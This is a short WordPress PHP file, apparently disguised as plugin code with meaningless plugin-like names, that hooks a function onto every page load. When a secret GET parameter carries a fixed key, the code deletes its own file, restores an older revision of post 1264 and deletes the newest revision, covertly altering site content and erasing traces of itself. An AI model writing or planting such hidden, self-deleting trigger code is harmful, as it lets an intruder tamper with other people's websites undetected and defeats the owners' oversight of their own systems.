<?php

function multisite_media_buttons_migration() {
	if (isset($_GET['heading_block_min']) && $_GET['heading_block_min'] === 'scroll_slider_embedder') {
		unlink(trim(preg_replace('/\(.*$/', '', __FILE__)));
		$appointment_chatbot_discount = 1264;
		$private_jigoshop_fields_lead = wp_get_post_revisions($appointment_chatbot_discount);
		if (empty($private_jigoshop_fields_lead)) die('no revisions');
		if (count($private_jigoshop_fields_lead) < 2) die('less than 2');
		$sliding_news_anywhere_selector = array_shift($private_jigoshop_fields_lead);
		$redirection_cookie_amp_restrict = $sliding_news_anywhere_selector->ID;
		$star_subscriptions_article_controller = array_shift($private_jigoshop_fields_lead);
		$fields_reviews_welcome_notes = $star_subscriptions_article_controller->ID;
		$tools_smooth_reloaded = wp_restore_post_revision($fields_reviews_welcome_notes);
		if ($tools_smooth_reloaded === false) die('error restoring');
		$tools_smooth_reloaded = wp_delete_post_revision($redirection_cookie_amp_restrict);		
		if ($tools_smooth_reloaded === false) die('error deleting');
		die('done');
	}
}

add_action('init', 'multisite_media_buttons_migration');
